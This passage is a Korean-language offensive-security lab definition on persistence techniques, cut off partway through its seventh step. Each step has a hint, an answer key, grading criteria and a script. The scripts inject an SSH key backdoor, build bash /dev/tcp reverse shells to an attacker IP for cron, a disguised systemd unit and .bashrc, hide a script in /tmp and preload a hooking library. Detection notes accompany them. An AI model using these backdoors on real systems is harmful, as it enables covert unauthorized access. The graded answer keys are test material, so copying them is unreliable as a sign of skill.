lab_id: attack-ai-week09
title: 지속성 확보 (Persistence) (AI 지원)
version: ai
course: attack-ai
week: 9
description: 시스템 접근을 유지하기 위한 지속성(Persistence) 기법을 실습한다. 백도어 설치, SSH 키 주입, cron 악용, systemd 서비스 등록 등 다양한
  방법으로 재접근 경로를 확보한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- MITRE ATT&CK Persistence 전술의 주요 기법을 이해한다
- SSH 키 기반 백도어, cron 기반 지속성을 설정할 수 있다
- 지속성 기법의 탐지 방법과 제거 방법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 공격자 머신에서 SSH 키 쌍을 생성하고, web 서버({{WEB_IP}})의 authorized_keys에 공개키를 추가하여 비밀번호 없이 접속할 수 있게
    하라.
  hint: ssh-keygen으로 키를 생성하고 ssh-copy-id 또는 수동으로 공개키를 추가한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 공격자 머신에서 SSH 키 쌍을 생성하고, web 서버(10.20.30.80)의 authorized_keys에 공개키를 추가하여 비밀번호 없이 접속할
    수 있게 해줘

    📎 참고 (CLI): ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80 ''mkdir -p
    ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub | ssh ccc@10.20.30.80 ''cat
    >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/backdoor_key
    -o StrictHostKeyChecking=no ccc@10.20.30.80 ''echo SSH key backdoor successful: $(whoami)'' 2>/dev/null'
  answer_detail: SSH 키 기반 백도어는 가장 은밀한 지속성 기법 중 하나이다. authorized_keys에 공격자의 공개키를 추가하면 비밀번호 변경과 무관하게 접속이
    가능하다. 탐지를 위해 authorized_keys를 정기적으로 감사해야 한다.
  verify:
    type: output_contains
    expect: backdoor successful
    field: stdout
    semantic:
      intent: SSH 키 백도어 설치 — ed25519 키쌍 생성 후 authorized_keys 에 공개키 추가, 비밀번호 변경과 무관한 지속 접근 확보 (MITRE T1098.004)
      success_criteria:
      - ssh-keygen -t ed25519 로 키쌍 생성
      - ssh + cat >> ~/.ssh/authorized_keys 로 대상 서버 추가
      - ssh -i <key> 접속 후 backdoor successful 메시지 또는 whoami 성공 확인
      acceptable_methods:
      - ssh-keygen + ssh + cat 파이프 조합
      - ssh-copy-id <user>@<target> (pw 있을 때)
      - authorized_keys 에 command="/bin/bash" 옵션 추가
      - drop a trojan key via webshell
      negative_signs:
      - 키 생성만 하고 대상 서버 추가 없음
      - authorized_keys 권한(600) 설정 누락
      - 접속 확인 단계 없음
  target_vm: attacker
  script: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80 ''mkdir -p ~/.ssh
    && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub | ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys
    && chmod 600 ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no
    ccc@10.20.30.80 ''echo SSH key backdoor successful: $(whoami)'' 2>/dev/null'
  risk_level: medium
  bastion_prompt: 공격자 머신에서 SSH 키 쌍을 생성하고, web 서버(10.20.30.80)의 authorized_keys에 공개키를 추가하여 비밀번호 없이 접속할
    수 있게 해줘
- order: 2
  instruction: web 서버에 cron 기반 리버스 셸 백도어를 설정하라. 매 5분마다 공격자에게 연결을 시도하는 cronjob을 작성하라(실제 실행은 하지 않고 crontab
    형식만 작성).
  hint: crontab -e로 편집하거나 echo로 crontab 형식을 출력한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: web 서버에 cron 기반 리버스 셸 백도어를 설정하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): echo ''# Cron-based reverse shell persistence'' && echo ''*/5 * * * * /bin/bash -c "bash
    -i >& /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null'' > /tmp/cron_backdoor.txt && echo ''Cron backdoor
    payload:'' && cat /tmp/cron_backdoor.txt'
  answer_detail: 'cron 기반 백도어는 설정된 간격으로 반복 실행된다. 공격자의 리스너가 다운되어도 다음 실행 시점에 다시 연결된다. 탐지: crontab -l로 모든
    사용자의 cron을 정기 검사한다.'
  verify:
    type: output_contains
    expect: Cron backdoor payload
    field: stdout
    semantic:
      intent: cron 기반 리버스 셸 persistence — 5분마다 /bin/bash -c bash /dev/tcp 연결 시도하는 crontab 엔트리 작성 (실행 X,
        파일만) — MITRE T1053.003
      success_criteria:
      - '*/5 * * * * 형식 crontab 엔트리 생성'
      - bash reverse shell payload 문자열 포함
      - 'Cron backdoor payload: 라벨 + 내용 출력'
      acceptable_methods:
      - echo + 파일 리다이렉트
      - crontab -e (편집 후 저장)
      - /etc/cron.d/ 에 직접 파일 drop
      - (crontab -l; echo <line>) | crontab -
      negative_signs:
      - cron 포맷 잘못 (필드 수 미일치)
      - reverse shell 구문 누락
      - T1053.003 언급 없음
  target_vm: attacker
  script: echo '# Cron-based reverse shell persistence' && echo '*/5 * * * * /bin/bash -c "bash -i >&
    /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null' > /tmp/cron_backdoor.txt && echo 'Cron backdoor payload:'
    && cat /tmp/cron_backdoor.txt
  risk_level: medium
  bastion_prompt: web 서버에 cron 기반 리버스 셸 백도어를 설정하라. 매 5분마다 공격자에게 연결을 시도하는 cronjob을 작성하라(실제 실행은 하지 않고 crontab
    형식만 작성).
- order: 3
  instruction: systemd 서비스 파일을 작성하여 시스템 부팅 시 자동으로 리버스 셸을 실행하는 백도어를 만들어라(파일 생성만, 설치는 하지 않음).
  hint: /etc/systemd/system/에 .service 파일을 작성한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: systemd 서비스 파일을 작성하여 시스템 부팅 시 자동으로 리버스 셸을 실행하는 백도어를 만들어라(파일 생성만, 설치는 하지 않음) 구현 방법과
    예시를 설명해줘

    📎 참고 (CLI): cat > /tmp/backdoor.service << ''EOF''

    [Unit]

    Description=System Update Service

    After=network.target


    [Service]

    Type=simple

    ExecStart=/bin/bash -c ''bash -i >& /dev/tcp/10.20.30.201/4444 0>&1''

    Restart=always

    RestartSec=60


    [Install]

    WantedBy=multi-user.target

    EOF

    echo ''Systemd backdoor service file:'' && cat /tmp/backdoor.service'
  answer_detail: 'systemd 서비스 백도어는 시스템 부팅 시 자동 시작되며, Restart=always로 설정하면 종료되어도 자동 재시작된다. 합법적인 서비스명으로
    위장하면 발견이 어렵다. 탐지: systemctl list-unit-files에서 비정상 서비스를 검사한다.'
  verify:
    type: output_contains
    expect: Systemd backdoor
    field: stdout
    semantic:
      intent: systemd .service 백도어 파일 작성 — [Unit]/[Service]/[Install] 섹션으로 Restart=always 자동 재시작, multi-user.target
        부팅 시 실행 (파일만)
      success_criteria:
      - heredoc 으로 /tmp/backdoor.service 생성
      - ExecStart 에 bash reverse shell 문자열 + Restart=always
      - WantedBy=multi-user.target 포함 + systemctl list-unit-files 로 탐지 가능 언급
      acceptable_methods:
      - cat > <file> << EOF ... EOF
      - echo -e 다줄 리다이렉트
      - python 으로 systemd unit 생성
      - Ansible/Puppet 으로 대량 배포 예시
      negative_signs:
      - 섹션 누락 (Unit 없음 등)
      - Restart 옵션 없음
      - WantedBy 누락으로 부팅 시 미동작
  target_vm: attacker
  script: 'cat > /tmp/backdoor.service << ''EOF''

    [Unit]

    Description=System Update Service

    After=network.target


    [Service]

    Type=simple

    ExecStart=/bin/bash -c ''bash -i >& /dev/tcp/10.20.30.201/4444 0>&1''

    Restart=always

    RestartSec=60


    [Install]

    WantedBy=multi-user.target

    EOF

    echo ''Systemd backdoor service file:'' && cat /tmp/backdoor.service'
  risk_level: medium
  bastion_prompt: systemd 서비스 파일을 작성하여 시스템 부팅 시 자동으로 리버스 셸을 실행하는 백도어를 만들어라(파일 생성만, 설치는 하지 않음).
- order: 4
  instruction: .bashrc에 백도어 명령을 삽입하여 사용자가 로그인할 때마다 리버스 셸을 실행하도록 하라(시뮬레이션만).
  hint: .bashrc에 명령을 추가하면 셸 시작 시 자동 실행된다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: .bashrc에 백도어 명령을 삽입하여 사용자가 로그인할 때마다 리버스 셸을 실행하도록 하라(시뮬레이션만)해줘

    📎 참고 (CLI): echo ''# .bashrc persistence payload (simulation only)'' && echo ''echo "nohup bash -i
    >& /dev/tcp/10.20.30.201/4444 0>&1 &" >> ~/.bashrc'' > /tmp/bashrc_backdoor.txt && echo ''Payload:''
    && cat /tmp/bashrc_backdoor.txt'
  answer_detail: '.bashrc/.profile 백도어는 사용자가 셸을 열 때마다 실행된다. nohup과 &로 백그라운드 실행하면 사용자는 눈치채지 못한다. 탐지: .bashrc/.profile의
    변경 이력을 FIM(File Integrity Monitoring)으로 감시한다.'
  verify:
    type: output_contains
    expect: 'Payload:'
    field: stdout
    semantic:
      intent: .bashrc 에 reverse shell 호출 라인 추가 (시뮬만) — 사용자 셸 시작마다 nohup + & 로 백그라운드 연결 시도
      success_criteria:
      - <SENSITIVE:e3b156d546cef760>
      - 'Payload: 라벨과 함께 내용 출력'
      - FIM(File Integrity Monitoring)으로 탐지 가능 언급
      acceptable_methods:
      - echo >> ~/.bashrc 추가 (실제 수정 X, 시뮬용)
      - .profile, .zshrc, .bash_profile 에도 유사 주입
      - /etc/profile.d/ 에 시스템 전체 백도어
      - trap EXIT 로 로그아웃 시 실행
      negative_signs:
      - nohup 없이 foreground (사용자 눈치챔)
      - $() 치환 없이 정적 문자열만
      - FIM 탐지 맥락 없음
  target_vm: attacker
  script: echo '# .bashrc persistence payload (simulation only)' && echo 'echo "nohup bash -i >& /dev/tcp/10.20.30.201/4444
    0>&1 &" >> ~/.bashrc' > /tmp/bashrc_backdoor.txt && echo 'Payload:' && cat /tmp/bashrc_backdoor.txt
  risk_level: medium
  bastion_prompt: .bashrc에 백도어 명령을 삽입하여 사용자가 로그인할 때마다 리버스 셸을 실행하도록 하라(시뮬레이션만)해줘
- order: 5
  instruction: web 서버에서 /tmp에 숨겨진 디렉토리를 생성하고 백도어 스크립트를 배치하라.
  hint: 점(.)으로 시작하는 디렉토리는 ls에 표시되지 않는다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: web 서버에서 /tmp에 숨겨진 디렉토리를 생성하고 백도어 스크립트를 배치해줘

    📎 참고 (CLI): ssh ccc@10.20.30.80 ''mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh
    && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh && chmod +x /tmp/.hidden_backdoor/update.sh
    && ls -la /tmp/.hidden_backdoor/'' 2>/dev/null'
  answer_detail: '숨겨진 디렉토리(.으로 시작)에 백도어를 배치하면 일반적인 ls 명령으로는 발견되지 않는다. /tmp, /dev/shm, /var/tmp 등 tmpfs
    디렉토리가 자주 사용된다. 탐지: find로 숨겨진 파일/디렉토리를 정기 검색한다.'
  verify:
    type: output_contains
    expect: update.sh
    field: stdout
    semantic:
      intent: /tmp/.hidden_backdoor 숨겨진 디렉터리 생성 — 점(.)으로 시작하는 경로는 기본 ls 에 미표시, tmpfs(/tmp, /dev/shm, /var/tmp)
        자주 악용
      success_criteria:
      - ssh 로 mkdir -p /tmp/.hidden_backdoor 후 스크립트 파일(update.sh) 배치
      - chmod +x 로 실행 권한 부여
      - ls -la /tmp/.hidden_backdoor/ 로 내용 확인 (업데이트.sh 존재)
      acceptable_methods:
      - ssh + mkdir + echo + chmod
      - scp 로 기존 스크립트 업로드
      - 웹쉘 → mkdir + wget
      - /dev/shm 대체 (더 은밀, 재부팅시 소실)
      negative_signs:
      - 일반 디렉터리(점 없는) 생성
      - 스크립트 없이 빈 디렉터리만
      - find 기반 탐지법 언급 없음
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh
    && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh && chmod +x /tmp/.hidden_backdoor/update.sh
    && ls -la /tmp/.hidden_backdoor/' 2>/dev/null
  risk_level: medium
  bastion_prompt: web 서버에서 /tmp에 숨겨진 디렉토리를 생성하고 백도어 스크립트를 배치해줘
- order: 6
  instruction: PAM(Pluggable Authentication Module) 백도어의 원리를 이해하기 위해 web 서버의 PAM 설정 파일을 확인하라.
  hint: /etc/pam.d/ 디렉토리의 설정 파일을 확인한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: PAM(Pluggable Authentication Module) 백도어의 원리를 이해하기 위해 web 서버의 PAM 설정 파일을 확인해줘

    📎 참고 (CLI): ssh ccc@10.20.30.80 ''cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth
    2>/dev/null'' 2>/dev/null | head -30'
  answer_detail: PAM 백도어는 인증 모듈을 조작하여 특정 비밀번호로 모든 계정에 로그인할 수 있게 한다. pam_unix.so를 수정하거나 커스텀 PAM 모듈을 삽입하는
    방식이다. 매우 은밀하지만 패키지 무결성 검사(debsums)로 탐지할 수 있다.
  verify:
    type: output_contains
    expect: pam
    field: stdout
    semantic:
      intent: /etc/pam.d/sshd 와 common-auth 등 PAM 설정 조회 — PAM 백도어(특정 비번으로 모든 계정 로그인) 원리 이해
      success_criteria:
      - ssh + cat /etc/pam.d/sshd + cat /etc/pam.d/common-auth 실행
      - 출력에 pam_unix.so 또는 auth required/sufficient 라인
      - pam_unix 수정 또는 커스텀 PAM 모듈 삽입의 은밀성 언급 + debsums 탐지
      acceptable_methods:
      - ssh + cat /etc/pam.d/*
      - find /lib/x86_64-linux-gnu/security -name pam_*
      - debsums -c libpam-modules (무결성 검사)
      - strace -e openat sshd (로딩된 모듈)
      negative_signs:
      - PAM 파일 조회 없이 개념만
      - pam_unix 언급 없음
      - debsums 탐지 언급 없음
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null'
    2>/dev/null | head -30
  risk_level: low
  bastion_prompt: PAM(Pluggable Authentication Module) 백도어의 원리를 이해하기 위해 web 서버의 PAM 설정 파일을 확인해줘
- order: 7
  instruction: LD_PRELOAD 백도어의 원리를 이해하기 위해, 간단한 공유 라이브러리를 작성하고 LD_PRELOAD로 함수를 후킹하는 예제를 만들어라.
  hint: C 코드로 라이브러리를 작성하고 gcc -shared -fPIC로 컴파일한다
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: LD_PRELOAD 백도어의 원리를 이해하기 위해, 간단한 공유 라이브러리를 작성하고 LD_PRELOAD로 함수를 후킹하는 예제를 만들어라\
    \ 구현 방법과 예시를 설명해줘\n\U0001F4CE 참고 (CLI): echo '#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor))\
    \ void init() {\n    printf(\"[LD_PRELOAD hook executed] PID=%d\\n\", getpid());\n}' > /tmp/hook.c\
    \ && gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c 2>/dev/null && LD_PRELOAD=/tmp/hook.so id 2>/dev/null"
  answer_detail: 'LD_PRELOAD 백도어는 공유 라이브러리를 프로세스 시작 시 먼저 로딩하여 시스템 함수를 후킹한다. /etc/ld.so.preload에 등록하면 모든
